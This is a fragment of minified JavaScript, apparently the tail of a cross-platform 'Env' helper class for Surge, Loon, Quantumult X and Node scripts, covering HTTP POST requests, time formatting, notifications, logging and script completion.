t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}
